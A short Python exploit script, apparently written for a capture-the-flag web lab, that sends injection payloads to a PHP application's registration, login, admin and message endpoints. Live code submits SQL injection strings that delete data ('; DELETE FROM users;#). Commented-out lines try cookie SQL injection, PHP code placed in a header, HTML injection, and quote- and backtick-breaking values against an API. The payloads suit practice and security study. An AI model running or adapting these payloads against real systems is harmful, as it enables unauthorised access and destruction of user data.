#!/usr/bin/env python

import requests
import json
from pprint import pprint

url = "http://10.10.161.41/"

cookies = {
	"PHPSESSID":"6u9ag5p4ssftrbsca68vihld6u",
	# "PHPSESSID":"6u9ag5p4ssftrbsca68vihld6u' OR 1=1",
}

# headers = {
	
# 	"User-Agent": "<?php phpinfo(); ?>"
# }

# r = requests.get(url, cookies = cookies)

# data = {
# 		"username":"john2",
# 		"country":"Afghanistan",
# 		"email":"a@a.com",
# 		"birthday":"1111-11-11",
# 		"description":"<h1>hello</h1>",
# }

# r = requests.post(url, data = data, cookies = cookies)
# print(r.text)

# data = {

# 	"sendto": "fc18e5f4aa09bbbb7fdedf5e277dda0`||`0",
# 	"message": "anything",
# }

# r = requests.post(url + "api/messages/", data =data, cookies = cookies)
# print(r.text)

# data = {
# 	"uid": "0cda3616fd444e73da75a5731e30bc4\" || \"9",
# }

# r = requests.get(url + "api/messages/", params = data, cookies = cookies)
# pprint(r.text)
# pprint(r.json())

s = requests.Session()

username="more\"; DELETE FROM users;--"
# password = "anything"
data = {
	"username": username,
	"password": "'; DELETE FROM users;#",
	"confirm_password": "'; DELETE FROM users;#",
}

r = s.post(url + "register/", data = data)

r = s.post(url + "login/index.php", data = data)

data = {
	
	"password": "'; DELETE FROM users;#",
	"new_password": "anything",
}

r = s.get(url + "admin/")
# print(r.text)

# print(r.text)

# r = requests.get(url)
	

print(r.text)